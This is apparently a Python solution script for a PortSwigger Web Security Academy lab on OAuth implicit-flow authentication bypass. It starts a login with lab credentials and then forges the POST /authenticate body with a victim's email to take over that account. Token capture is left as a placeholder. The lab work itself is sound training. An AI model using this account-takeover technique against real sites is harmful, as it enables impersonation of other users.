"""
Lab 1: Authentication bypass via OAuth implicit flow
https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow
Difficulty: Apprentice

📝 The flaw: after the OAuth provider redirects back with an access_token in the
URL fragment, the client app's JS reads the token client-side, then POSTs the
user's claimed email/username to its own /authenticate endpoint — and trusts
that email WITHOUT checking it against the token. We just lie about the email.

Goal: log in as carlos@carlos-montoya.net using our own wiener:peter social login.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"  # client app (the blog)
WIENER = {"username": "wiener", "password": "peter"}
VICTIM_EMAIL = "carlos@carlos-montoya.net"


def run():
    s = get_session()
    note("Step 1: kick off the normal OAuth login as wiener so we get a real,")
    note("valid access_token from the provider — we only forge the email later.")

    # 1. Hit the client app's "My account" / social-login entry point.
    r = s.get(f"{TARGET}/social-login")
    log(f"Started OAuth flow, landed on provider at: {r.url}")

    # 2. In a real run you'd follow the provider's login form here (requests
    #    auto-follows redirects, so `s` already carries the session cookies).
    #    Submitting wiener/peter on the provider's /login completes the flow
    #    and the provider redirects back to TARGET/oauth-callback#access_token=...

    # 3. The client app's JS then fires:
    #      POST /authenticate  {"email": "wiener@...", "access_token": "..."}
    #    Replay that request ourselves with the email swapped to carlos's.
    note("Step 2: forge the POST /authenticate body with carlos's email instead")
    note("of our own — the server trusts this field unconditionally.")

    forged_body = {
        "email": VICTIM_EMAIL,
        # access_token would be the real one captured from the fragment above
        "access_token": "REPLACE_WITH_TOKEN_CAPTURED_IN_BURP",
    }
    r = s.post(f"{TARGET}/authenticate", json=forged_body)
    log(f"/authenticate responded {r.status_code}")

    # 4. Visit the account page — should now show carlos's details.
    r = s.get(f"{TARGET}/my-account")
    if VICTIM_EMAIL in r.text:
        log("Logged in as carlos — lab solved!")
    else:
        log("Didn't land in carlos's account — check the captured token.", ok=False)


if __name__ == "__main__":
    run()
